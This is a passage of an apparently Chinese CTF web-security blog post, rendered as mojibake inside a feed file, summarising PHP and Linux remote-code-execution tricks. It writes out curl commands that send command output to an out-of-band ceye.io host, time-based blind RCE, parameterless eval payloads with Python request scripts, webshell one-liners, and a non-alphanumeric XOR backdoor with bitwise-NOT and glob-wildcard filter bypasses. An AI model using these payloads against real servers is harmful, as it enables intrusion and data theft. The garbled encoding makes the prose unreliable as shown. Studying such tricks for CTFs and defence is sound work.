wget</code>ç­‰ç­‰ç›´æ¥è®¿é—®æˆ‘ä»¬vpsä¸Šçš„æå‰å†™å¥½çš„åå¼¹shellæ–‡ä»¶ã€‚</p><p>ä¹‹äºæ›´æ·±ä¸€æ­¥çš„å‘½ä»¤æ‰§è¡Œæš‚ä¸”ä¸è°ˆã€‚åœ¨æ¸—é€ä¸­è‡ªç„¶ä¼šç”¨åˆ°çš„ã€‚</p><h2 id="bypassé•¿åº¦é™åˆ¶"><a href="#bypassé•¿åº¦é™åˆ¶" class="headerlink" title="bypassé•¿åº¦é™åˆ¶"></a>bypassé•¿åº¦é™åˆ¶</h2><p>HITCON2017çš„baby-first-revengeçš„ä¾‹å­å¯ä»¥è¯´æ˜¯è€ä¾‹å­äº†ã€‚å®ƒçš„bypassé•¿åº¦å¯ä»¥è¾¾åˆ°5ä¸ª<br>å…·ä½“trickæ˜¯ä»¥ä¸‹è¿™äº›ï¼š</p><pre><code class="bash">ls -t å¯ä»¥æŒ‰æ—¶é—´é¡ºåºåˆ—å‡ºæ‰€æœ‰æ–‡ä»¶linux å¯ä»¥ç”¨\è¿›è¡Œå‘½ä»¤çš„æ¢è¡Œæ¢è¡Œä¸å½±å“å‘½ä»¤æ‰§è¡Œsh _åªè¦å››ä¸ªå­—ç¬¦å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤</code></pre><p>ç„¶è€Œå› ä¸ºè¿™ä¸ªè§£å†³æ–¹æ¡ˆå¤ªè¿‡é«˜çº§ï¼Œå¯¼è‡´å¤§å®¶éƒ½ä¼šäº†åå°±ä¸ä¼šå†æœ‰äººå‡ºè¿™æ–¹é¢çš„é¢˜ç›®è€ƒå¯Ÿäº†â€¦â€¦</p><h2 id="ç›²æ‰“-RCE-amp-timebased-RCE"><a href="#ç›²æ‰“-RCE-amp-timebased-RCE" class="headerlink" title="ç›²æ‰“ RCE &amp; timebased RCE"></a>ç›²æ‰“ RCE &amp; timebased RCE</h2><p>time-based RCEæ˜¯ä¸€ä¸ªå¸¸å¸¸ä½œä¸ºæ‹”é«˜æ°´å¹³çš„å‘½ä»¤æ‰§è¡Œè€ƒç‚¹ã€‚å…·ä½“å¸¸è§äºä¸€ä¸‹ä»£ç </p><pre><code class="php">&lt;?php$cmd = $_GET[`cmd`];`$cmd`;</code></pre><p>å½“æˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œæ²¡æœ‰å›æ˜¾æ€ä¹ˆåŠï¼Ÿå¸¸è§åŠæ³•ä¹‹ä¸€å½“ç„¶æ˜¯åˆ©ç”¨curl,æˆ–è€…wgetæŠŠç»“æœæ‰“åˆ°vpsä¸Šã€‚æœ‰ç‚¹xxeç›²æ‰“çš„å‘³é“ã€‚åªä¸è¿‡å¹¶ä¸éœ€è¦æå‰æ”¾å¥½æ–‡ä»¶ï¼Œåªè¦vpsç›‘å¬å³å¯ã€‚</p><pre><code class="bash">curl http://ip.port.b182oj.ceye.io/`ls`</code></pre><p>å½“ç„¶getè¯·æ±‚çš„å¼Šç«¯ä¹‹ä¸€æ˜¯æˆ‘ä»¬åªèƒ½æ‰“å‡ºç»“æœçš„ä¸€è¡Œç»“æœï¼Œè¿™å½“ç„¶æ˜¯ä¸è¡Œçš„<br>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è½»æ¾åˆ©ç”¨sedå‘½ä»¤è§£å†³é—®é¢˜ã€‚</p><pre><code class="bash">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p`curl http://ip.port.b182oj.ceye.io/`ls | sed -n 2p`curl http://ip.port.b182oj.ceye.io/`ls | sed -n 3p`</code></pre><p>å°†åˆ†åˆ«æ‰“å‡ºæ¯ä¸€è¡Œçš„ä¿¡æ¯ã€‚<br>è¿›ä¸€æ­¥è¿˜å¯ä»¥æ‰“å‡ºä»»æ„è¡Œä»»æ„å­—æ®µå†…å®¹</p><pre><code class="bash">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1`  æˆªå–ç¬¬ä¸€ä¸ªå­—curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1-3` æˆªå–ç¬¬1~3ä¸ªå­—curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 2-5` æˆªå–ç¬¬2~5ä¸ª</code></pre><p>åœ¨æ­¤åŸºç¡€ä¸Šä¹Ÿè¯ç”Ÿäº†time-based RCEã€‚åŸç†å°±å¦‚ä¸Šé¢ä¸€æ ·ã€‚å› ä¸ºå·²ç»æ²¡æœ‰å›æ˜¾äº†ï¼Œæˆ‘ä»¬åœ¨æµè§ˆå™¨é¡µé¢å°±å¯ä»¥ç›´æ¥æ„é€ rce</p><pre><code class="bash">if [$(whoami|base32|cut â€“c 1)=O];then sleep 10;fi</code></pre><p>ç±»ä¼¼sqlæ—¶é—´ç›²æ³¨çš„åŸç†ã€‚å…¶ä¸­<code>[ ]</code>æ˜¯linuxçš„æ¡ä»¶è¡¨è¾¾å¼ç¬¦å·ã€‚ä½¿ç”¨base32æ˜¯å› ä¸ºæˆ‘ä»¬çš„è¿”å›å€¼å¯èƒ½æœ‰ç‰¹æ®Šå­—ç¬¦ã€‚<br>è¿™æ ·å°±å®Œå…¨å¯ä»¥ä¾é ç›²æ‰“è„šæœ¬æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>å…³äºlinuxå‘½ä»¤è¿˜æœ‰äº›tricks æ²¡æœ‰æåˆ°ï¼Œä¸€æ–¹é¢æ˜¯å› ä¸ºè‡ªå·±äº†è§£çš„æ¯•ç«Ÿæ˜¯æœ‰é™çš„ã€‚å¦ä¸€æ–¹é¢æ˜¯å› ä¸ºä¸‹é¢çš„å†…å®¹ä¸­å°†ç»§ç»­ä½¿ç”¨åˆ°ã€‚å…³äºphpç»“åˆlinuxå‘½ä»¤çš„ä¸€äº›tricksã€‚</p><h1 id="php-RCE-bypass-amp-èŠ±å¼å†™shell"><a href="#php-RCE-bypass-amp-èŠ±å¼å†™shell" class="headerlink" title="php RCE bypass &amp; èŠ±å¼å†™shell"></a>php RCE bypass &amp; èŠ±å¼å†™shell</h1><p>phpä¸­çš„RCEæ–¹å¼å¯ä¸å°‘ã€‚é€šå¸¸æœ€å¤§çš„éš¾ç‚¹æ˜¯å†™ä¸€ä¸ªwebshellå‡ºæ¥ã€‚è€Œå†™å‡ºwebshellåæ‰§è¡Œå‘½ä»¤ä¹Ÿä¼šé‡åˆ°ç¦ç”¨ç³»ç»Ÿå‡½æ•°çš„æƒ…å†µã€‚è¿™ç§æ—¶å€™å°±æœ‰è®¸è®¸å¤šå¤šçš„é«˜çº§æŠ€å·§ã€‚ä¸ä»…ä»…æ˜¯phpçš„ç‰¹æ€§é—®é¢˜äº†ï¼Œè¿˜æœ‰è®¸å¤šé«˜çº§æ„é€ ã€‚</p><h2 id="æ— å‚RCE"><a href="#æ— å‚RCE" class="headerlink" title="æ— å‚RCE"></a>æ— å‚RCE</h2><p>  ä¹‹æ‰€ä»¥æŠŠæ— å‚RCEæ”¾åˆ°è¿™ä¸€å—ã€‚å°±æ˜¯å› ä¸ºæ— å‚RCEçš„åˆ©ç”¨ä¸»è¦ä¾é phpå‡½æ•°è¾¾æˆã€‚æ‰€ä»¥å°ç»“ä¸‹å¸¸è§trickã€‚</p><pre><code class="php">if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {        eval($_GET[&#39;code&#39;]);}</code></pre><p>æœ€æ—©å‡ºè‡ªäºpç‰›çš„easyphplimit<a href="https://www.jianshu.com/p/19a37402554f" target="_blank" rel="noopener">https://www.jianshu.com/p/19a37402554f</a>æˆ‘è¿˜åœ¨GXYCTFä¸­å¤ç°åŒä¸ºæ— å‚RCEçš„é¢˜ç›®<a href="https://www.jianshu.com/p/2b5e7bd64264" target="_blank" rel="noopener">https://www.jianshu.com/p/2b5e7bd64264</a><br>å…¶å®æ— å‚RCEçš„ä¸»è¦è¦ç‚¹å°±æ˜¯åªèƒ½æ‰§è¡Œå¦‚ä¸‹ç±»å‹å‡½æ•°</p><pre><code class="php">a(b(c()));a();</code></pre><p>ä¸ªäººç¬¬ä¸€ä¹ æƒ¯é¦–å…ˆæ˜¯ä½¿ç”¨</p><pre><code class="php">print_r(scandir(&#39;.&#39;))</code></pre><p>æ¢æµ‹ç›®å½•ã€‚ä½†æ­¤å¤„æ˜¾ç„¶<code>.  &#39;&#39;</code>éƒ½ä½¿ç”¨ä¸äº†ã€‚é‚£ä¹ˆæ€ä¹ˆæ„é€ å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥è½»æ¾ä½¿ç”¨å‡½æ•°è¾¾æˆ</p><pre><code class="php">print_r(scandir(current(localeconv())));</code></pre><p><code>localeconv</code>è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚å…¶æ•°ç»„å¤´ä¸€ä¸ªå€¼ä¸º<code>decimal_point</code>ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç‚¹ã€‚ <code>current()</code>èµ·åˆ°å–å‡ºæ•°ç»„ç¬¬<br>ä¸€ä¸ªå˜é‡çš„ä½œç”¨ï¼Œæ‰€ä»¥å¯ä»¥ä»¥æ­¤æ›¿ä»£scandirè¦ç”¨çš„ç‚¹ã€‚<br>è¿˜æœ‰ä¸€ç§å¸¸è§„ç‚¹çš„åšæ³•ï¼Œåªéœ€<code>getcwd()</code>å³å¯è¿”å›ç›®å½•ã€‚è€Œ<code>dirname()</code>å¯ä»¥å¾€ç›®å½•ä¸Šè·³ã€‚å½“ç„¶ï¼Œå¦‚æœæƒ³è¯»å–çš„æ–‡ä»¶åœ¨ä¸Šçº§ç›®å½•ï¼Œå°±å¾—å†åŠ ä¸Šä¸€ä¸ª<code>chdir()</code><br>æ¯”å¦‚code-breakngçš„payload</p><pre><code>readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre><p>å…¶ä¸­ç”¨åˆ°çš„array_reverse()ä¹Ÿæ˜¯ä¸ºäº†åº”å¯¹flagçš„æ•°ç»„ç´¢å¼•ä¸æ˜¯ç‰¹æ®Šç´¢å¼•çš„æƒ…å†µã€‚è°ƒæ•´åä½¿ç”¨<code>current, nextï¼Œend</code>å¯ä»¥è§£å†³å¤§éƒ¨åˆ†é—®é¢˜ã€‚</p><p>å½“ç„¶è¿™ç±»æ— å‚RCEè¿˜æœ‰å…¶ä»–ç”¨æ³•ï¼Œæ¯”å¦‚ï¼š<br>1.<code>getenv()</code>å‡½æ•°<br>è¿™ä¸€å‡½æ•°å°†è¿”å›ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ï¼Œè€Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ä»è¿™ä¸ªæ•°ç»„ä¸­é€‰å–éœ€è¦çš„å€¼è¿›è¡Œåˆ©ç”¨ã€‚<br>å¸¸å¸¸æ˜¯ï¼š</p><pre><code class="php">array_rand(array_flip(getenv()));</code></pre><p>å¯ä»¥éšæœºè·å–æ•°ç»„ä¸­æŸä¸€ä¸ªé”®å€¼ã€‚çˆ†ç ´ä¹‹åèƒ½æ‹¿åˆ°æ•°ç»„ä¸­æŒ‡å®šå€¼</p><p>2.<code>getallheaders()</code></p><p>ä»httpå¤´ä¸­è·å–å€¼ã€‚å› æ­¤ååˆ†ä¾¿æ·ã€‚æ¯”å¦‚å½“httpå¤´æœ€åä¸€ä¸ªå€¼ä½¿æˆ‘ä»¬æ„é€ å¥½çš„<code>byc: phpinfo()</code></p><pre><code class="php">var_dump(end(getallheaders()));</code></pre><p>å¦‚æ­¤å³å¯æ‰§è¡Œ<code>phpinfo()</code><br>ä½†æ˜¯æ³¨æ„ï¼Œè¿™æ˜¯ä¸ªapacheå‡½æ•°ï¼Œå¦‚æœé‡åˆ°nginxå°†ä¸å†é€‚ç”¨ã€‚<br>3.<code>get_defined_vars()</code><br>æ­£æ˜¯ä¸ºäº†åº”å¯¹getallheadersçš„ç¼ºé™·ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©<code>get_defined_vars()</code>ã€‚å› ä¸ºå®ƒè¿”å›çš„å°†æ˜¯å…¨å±€å˜é‡ï¼Œå…¨å±€å˜é‡åŒ…æ‹¬<code>$_GET  $_POST</code>éƒ½æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨çš„ã€‚è¿™æ ·æˆ‘ä»¬å°±å¤šäº†ä¸€ä¸ªå¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ã€‚æ¯”å¦‚å–å‡ºäº†_GETçš„è¯ã€‚</p><pre><code class="php">?cmd=eval(end(current(get_defined_vars())));&amp;byc=system(&#39;ls&#39;);</code></pre><p>ç”šè‡³æˆ‘ä»¬ä¹Ÿèƒ½åˆ©ç”¨<code>$_FILES</code>ï¼Œé€šè¿‡ä¼ªé€ æ–‡ä»¶ä¸Šä¼ è¾¾æˆè°ƒç”¨</p><pre><code class="python">import requestsfrom io import BytesIOpayload = &quot;system(&#39;cat /flag&#39;);&quot;.encode(&#39;hex&#39;)files = {  payload: BytesIO(&#39;2333!&#39;)}r = requests.post(&#39;http://localhost/shell.php?cmd=eval(hex2bin(array_rand(end(get_defined_vars()))));&#39;, files=files, allow_redirects=False)print (r.text)</code></pre><p>ä½¿ç”¨hex2binæ˜¯ä¸ºäº†é˜²æ­¢å…³é”®å­—çš„è¿‡æ»¤æˆ–è½¬æ¢ã€‚</p><p>4.<code>session_id()</code>å‡½æ•°</p><p>ä¸ä¸Šé¢çš„å…¨å±€å˜é‡åŒæ ·çš„é“ç†ã€‚åªä¸è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨phpçš„ç‰¹æ€§ã€‚åªè¦æ˜¯<code>PHPSESSID</code>åçš„å€¼ï¼Œå°±å¯ä»¥ç›´æ¥èµ‹ç»™<code>session_id</code>ã€‚æ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬åªéœ€è§£å†³<code>session_id</code>å€¼ä¸ºå­—æ¯åŠ æ•°å­—çš„é—®é¢˜äº†ã€‚åŒæ ·ä½¿ç”¨<code>hex2bin</code>å³å¯<br>å‰ææ¡ä»¶æ˜¯è¦å…ˆsession_start()</p><pre><code class="python">import requestsurl = &#39;http://localhost/shell.php?cmd=eval(hex2bin(session_id(session_start())));&#39;payload = &quot;echo &#39;23333&#39;;&quot;.encode(&#39;hex&#39;)cookies = {    &#39;PHPSESSID&#39;:payload}r = requests.get(url=url,cookies=cookies)print (r.text)</code></pre><h2 id="èŠ±å¼å†™shell"><a href="#èŠ±å¼å†™shell" class="headerlink" title="èŠ±å¼å†™shell"></a>èŠ±å¼å†™shell</h2><p>èŠ±å¼å†™shellç®—æ˜¯phpä¸€ä¸ªååˆ†è€ƒéªŒæŠ€å·§çš„ç‚¹äº†ã€‚å½“ç„¶ä¹‹å‰ä¸Šé¢linuxéƒ¨åˆ†æ‰€å†™çš„bypassé•¿åº¦ä¹Ÿç®—èŠ±å¼å†™shellã€‚ä½†æ˜¯é‚£ä¸»è¦åˆ©ç”¨çš„æ˜¯linuxçš„ç‰¹æ€§ã€‚æˆ‘ä»¬è¿™é‡Œå°è¯•ä½¿ç”¨phpçš„ç‰¹æ€§ï¼Œå†™å‡ ç§æœ€å¸¸è§çš„webshell</p><p>1.å¸¸è§„æ‹†åˆ†</p><pre><code class="php">cmd=`$_GET[1]`;&amp;1</code></pre><p>åŸºæœ¬ç®—æ˜¯ç”¨çƒ‚äº†ï¼Œä¹Ÿæ˜¯æˆ‘è¿™ç§èœé¸¡æœ€å–œæ¬¢ç”¨çš„ç±»å‹ã€‚ç›¸å½“ä¸å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ã€‚</p><p>2.include</p><pre><code class="php">cmd=include$_GET[1];</code></pre><p>å¾ˆå¦™ï¼Œä½†æ˜¯å¯èƒ½ä¼šå—é™äºè¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚è¿™ä¸ªé€‰é¡¹é»˜è®¤æ˜¯ä¸å¼€å¯çš„ã€‚</p><p>3.includeå‡çº§ç‰ˆ<br>ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æœ¬åœ°æ–‡ä»¶åŒ…å«ã€‚ä¸ºæ­¤åªè¦<code>file_put_contents()</code>å†™å…¥ä¸€ä¸ªæ–‡ä»¶å³å¯</p><pre><code>$_GET[a](N,a,8);&amp;a=file_put_contents</code></pre><p>å…¶ä¸­<code>file_put_contents</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶åã€‚PHPä¼šè®¤ä¸ºNæ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œä½†ä¹‹å‰å¹¶æ²¡æœ‰å®šä¹‰è¿™ä¸ªå¸¸é‡ï¼Œäºæ˜¯PHPå°±ä¼šæŠŠå®ƒè½¬æ¢æˆå­—ç¬¦ä¸²â€™Nâ€™ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦å†™å…¥çš„æ•°æ®ï¼Œaä¹Ÿè¢«è½¬æ¢æˆå­—ç¬¦ä¸²â€™aâ€™ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯flagï¼Œå½“flag=8çš„æ—¶å€™å†…å®¹ä¼šè¿½åŠ åœ¨æ–‡ä»¶æœ«å°¾ï¼Œè€Œä¸æ˜¯è¦†ç›–ã€‚<br>ç”±äºå†™å…¥ç¬¦å·æ—¶å‡½æ•°ä¼šæŠ¥é”™ï¼Œå¯ä»¥é€‰æ‹©å†™å…¥payloadçš„base64,åˆ†æ¬¡å†™å…¥ï¼Œæœ€åä¼ªåè®®åŒ…å«ï¼š</p><pre><code class="php">cmd=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N</code></pre><p>4.å˜é•¿å‚æ•°+å›è°ƒåé—¨</p><p>pç‰›ç»™å‡ºçš„æ— è§†wafçš„ç¥æ‹›ã€‚åˆ©ç”¨äº†php5.6çš„ç‰¹æ€§ã€‚</p><p>åœ¨PHPä¸­å¯ä»¥ä½¿ç”¨ <code>func(...$arr)</code>è¿™æ ·çš„æ–¹å¼ï¼Œå°†$arræ•°ç»„å±•å¼€æˆå¤šä¸ªå‚æ•°ï¼Œä¼ å…¥funcå‡½æ•°ã€‚<br>æ‰€ä»¥å¯ä»¥</p><pre><code class="php">cmd=usort(...$_GET);</code></pre><p>ä»¥ä¸‹å‚æ•°getä¼ å€¼ã€‚</p><pre><code class="php">1[]=test&amp;1[]=phpinfo();&amp;2=assert</code></pre><p>pç‰›è§£é‡Šæ˜¯ï¼š</p><blockquote><p>å¤§æ¦‚è¿‡ç¨‹å°±æ˜¯ï¼ŒGETå˜é‡è¢«å±•å¼€æˆä¸¤ä¸ªå‚æ•°[â€˜testâ€™, â€˜phpinfo();â€™]å’Œassertï¼Œä¼ å…¥usortå‡½æ•°ã€‚usortå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°assertï¼Œå…¶è°ƒç”¨äº†ç¬¬ä¸€ä¸ªå‚æ•°ä¸­çš„phpinfo();ã€‚ä¿®æ”¹phpinfo();ä¸ºwebshellå³å¯ã€‚</p></blockquote><p>è¿™ä¸ªåšæ³•æœ€å¦™çš„å°±æ˜¯<code>...$_GET</code>ç»•è¿‡wafã€‚</p><h2 id="å†™ç•¸å½¢shell"><a href="#å†™ç•¸å½¢shell" class="headerlink" title="å†™ç•¸å½¢shell"></a>å†™ç•¸å½¢shell</h2><h3 id="phpçš„æŸäº›ç‰¹æ€§"><a href="#phpçš„æŸäº›ç‰¹æ€§" class="headerlink" title="phpçš„æŸäº›ç‰¹æ€§"></a>phpçš„æŸäº›ç‰¹æ€§</h3><p>åº”è¯¥è¯´è¦å…ˆç†Ÿæ‚‰ä¸€ä¸‹phpä¸­å¤§æ‹¬å·çš„å¦™å¤„,å¯å˜å˜é‡çš„å¦™å¤„</p><pre><code class="PHP">&lt;?php$a=&quot;hello&quot;;$$a=&quot;world&quot;;echo &quot;$a ${$a}&quot;;//hello worldecho &quot;$a $hello&quot;;//hello world</code></pre><pre><code>${&quot;_GET&quot;}====&gt;$_GET</code></pre><p>åŒæ—¶åœ¨<code>${}</code>ä¸­ï¼Œå­—ç¬¦ä¸²å¦‚æœä¸å¸¦<code>&#39;&#39; ,&quot; &quot;</code>ã€‚å¹¶ä¸ä¼šå½±å“ç”Ÿæˆä»¥å…¶ä¸ºåçš„å˜é‡</p><pre><code class="bash">php &gt; $a=1111;php &gt; var_dump(${a});PHP Warning:  Use of undefined constant a - assumed &#39;a&#39; (this will throw an Error in a future version of PHP) in php shell code on line 1</code></pre><p>å‡å¦‚æˆ‘ä»¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå°±ä¼šå‘ç°å®ƒåœ¨<code>${}</code>ä¸­æ˜¯ä¼šè¢«è§£æçš„ã€‚</p><pre><code class="php">$a=&#39;b&#39;${$a}=&gt;$bvar_dump(${$a});=&gt;var_dump($b);$b=&#39;1&#39;=&gt;string(1) &quot;1&quot;</code></pre><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ˜ç™½ï¼š<br><code>$$</code>æˆ–<code>${}</code>èƒ½åˆ©ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ›é€ å‡ºä¸€ä¸ªåŒåå˜é‡ã€‚å˜é‡ååªèƒ½åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ä»¥åŠä¸‹åˆ’çº¿ï¼›ä½†æ˜¯<code>${}</code>å¯ä»¥ä½¿å¾—åªåŒ…å«æ•°å­—ï¼Œæ¯”å¦‚<code>${1}</code>ã€‚æ­¤æ—¶<code>${1}</code>å°±å˜æˆäº†ä¸€ä¸ªå˜é‡ã€‚</p><h3 id="å„ç§æ–¹æ³•"><a href="#å„ç§æ–¹æ³•" class="headerlink" title="å„ç§æ–¹æ³•"></a>å„ç§æ–¹æ³•</h3><ol><li>å¼‚æˆ–<br>è¿™ä¸ªæ–¹æ³•å¾ˆå¸¸è§ï¼Œä½†æ˜¯è‡ªå·±è¿˜æ²¡åœ¨å®é™…æ¯”èµ›ä¸­ç”¨åˆ°è¿‡â€¦â€¦<br>ä¸€ä¸ªéæ•°å­—å­—æ¯çš„åé—¨<pre><code class="php">&lt;?php @$_++; // $_ = 1 $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _ $__.=(&quot;.&quot;^&quot;~&quot;); // _P $__.=(&quot;/&quot;^&quot;`&quot;); // _PO $__.=(&quot;|&quot;^&quot;/&quot;); // _POS $__.=(&quot;{&quot;^&quot;/&quot;); // _POST  ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);?&gt;$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);</code></pre>å…¶å®å¼‚æˆ–å°±æ˜¯å­—ç¬¦çš„asciiè½¬äºŒè¿›åˆ¶å¼‚æˆ–åå†è½¬asciiè½¬å­—ç¬¦ä¸²ã€‚</li></ol><p>2.å–å<br>èƒ½å¼‚æˆ–å°±èƒ½å–åã€‚ä½è¿ç®—ç‰›bã€‚æ¯”å¦‚pç‰›çš„è¿™ä¸ªä¾‹å­ï¼š<br><code>&#39;å’Œ&#39;{2}</code>çš„ç»“æœ<code>&quot;\x8c&quot;</code>å–åæ˜¯<code>s</code><br>è¿™é‡Œè¿˜åˆ©ç”¨äº†phpä¸­æ•°ç»„å¯ä»¥ä½¿ç”¨<code>{}</code>æ›¿æ¢<code>[]</code>çš„æ€§è´¨ã€‚<br>â€œå’Œâ€çš„ç¬¬ä¸‰ä¸ªå­—èŠ‚çš„å€¼ä¸º140[0x8c]ï¼Œå–åçš„å€¼ä¸º-141ã€‚<br>è´Ÿæ•°ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œé€šå¸¸ç”¨çš„æ˜¯è¡¥ç çš„æ–¹å¼è¡¨ç¤ºã€‚è´Ÿæ•°çš„è¡¥ç æ˜¯å®ƒæœ¬èº«çš„å€¼æ¯ä½æ±‚å,æœ€åå†åŠ ä¸€ã€‚141çš„16è¿›åˆ¶ä¸º0xff73ï¼Œphpä¸­chr(0xff73)==115ï¼Œ115å°±æ˜¯sçš„ASCIIå€¼ã€‚</p><pre><code class="python">def get(shell):        hexbit=&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))       print(hexbit)</code></pre><pre><code class="php">php &gt; echo(~(&quot;\x8f\x97\x8f\x96\x91\x99\x90&quot;));phpinfo</code></pre><p>3.è‡ªå¢è¿ç®—ç¬¦<br>è‡ªå¢è¿ç®—ç¬¦æ„é€ æ•°å­—ä¹Ÿæ˜¯æŠ€å·§</p><pre><code class="php">&lt;?php$_++;print($_);?&gt;</code></pre><p><code>$_=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)</code>ä¹Ÿæ˜¯å¯ä»¥å¾—åˆ°<code>2</code>çš„ã€‚è¿™ç‚¹è¿˜å¯ä»¥æ„é€ æ•°ç»„é”®å€¼ã€‚</p><p>4.çŸ­æ ‡ç­¾+é€šé…ç¬¦</p><p>ä¹‹å‰åœ¨ciscnä¸­é‡åˆ°è¿‡ã€‚ä¸€ä¸ª<code>&lt;?php?&gt;</code>ç®—æ˜¯phpçš„é•¿æ ‡ç­¾ï¼Œè€Œ<code>&lt;?=?&gt;</code>ç®—çŸ­æ ‡ç­¾ã€‚ä½†æ˜¯è¿™æ ·å°±å¯ä»¥æ‰§è¡Œå‡½æ•°äº†ï¼Œè€Œä¸”å¯ä»¥é€šè¿‡fuzzè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚ç”±äºlinuxä¸­å¯ä»¥ç”¨<code>?</code>æ¥è¿›è¡Œå•ä¸ªå­—æ¯çš„åŒ¹é…ï¼š</p><pre><code class="bash">$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;/bin/cat /var/www/html/index.php</code></pre><p>å®é™…ä¸Šæ˜¯åº”ç”¨äº†linuxçš„globé€šé…ç¬¦çš„ä½œç”¨ã€‚æ—¢ç„¶<code>`</code>å¯ä»¥å†…è”æ‰§è¡Œã€‚åªè¦èƒ½åŒ¹é…å®Œå…¨å°±å¯ä»¥è¾¾åˆ°å†™shellå‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚<br>å½“ç„¶ï¼Œç¬¦åˆåŒ¹é…ç»“æœçš„å‘½ä»¤å¯èƒ½æœ‰å¤šä¸ªã€‚æˆ‘ä»¬å¯ä»¥åŠ ä¸Šå…¶ä»–é€šé…ç¬¦</p><pre><code class="bash">[^x] è¡¨ç¤ºè¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦x[0-9] è¡¨ç¤ºæ•°å­—èŒƒå›´[@-[]è¡¨ç¤ºå¤§å†™å­—æ¯</code></pre><p>å‡å¦‚åŒ¹é…åˆ°ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>5.php7 åŠ¨æ€å‡½æ•° </p><pre><code>(~%8F%97%8F%96%91%99%90)();//phpinfo()</code></pre><p>php7å°±æ”¯æŒä½¿ç”¨<code>($a)();</code>è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„</p><p>æš‚ä¸”å†™è¿™ä¹ˆå¤šå§ã€‚æ¯•ç«Ÿphpçš„å¥‡å¦™ä¹‹å¤„å¤ªå¤šäº†ï¼Œä¸€æ—¶åŠä¼šæ˜¯æ€»ç»“ä¸å®Œçš„ã€‚<br>è¿™å‘¨æœ«å°±æ˜¯ç¬¬ä¸€æ¬¡ä»¥X1cçš„é˜Ÿå‘˜èº«ä»½æ‰“æ¯”èµ›äº†ï¼Œè¦åŠ æ²¹å•Šã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a><br><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a><br><a href="https://skysec.top/2017/12/29/Time-Based-RCE/" target="_blank" rel="noopener">https://skysec.top/2017/12/29/Time-Based-RCE/</a><br><a href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell" target="_blank" rel="noopener">https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
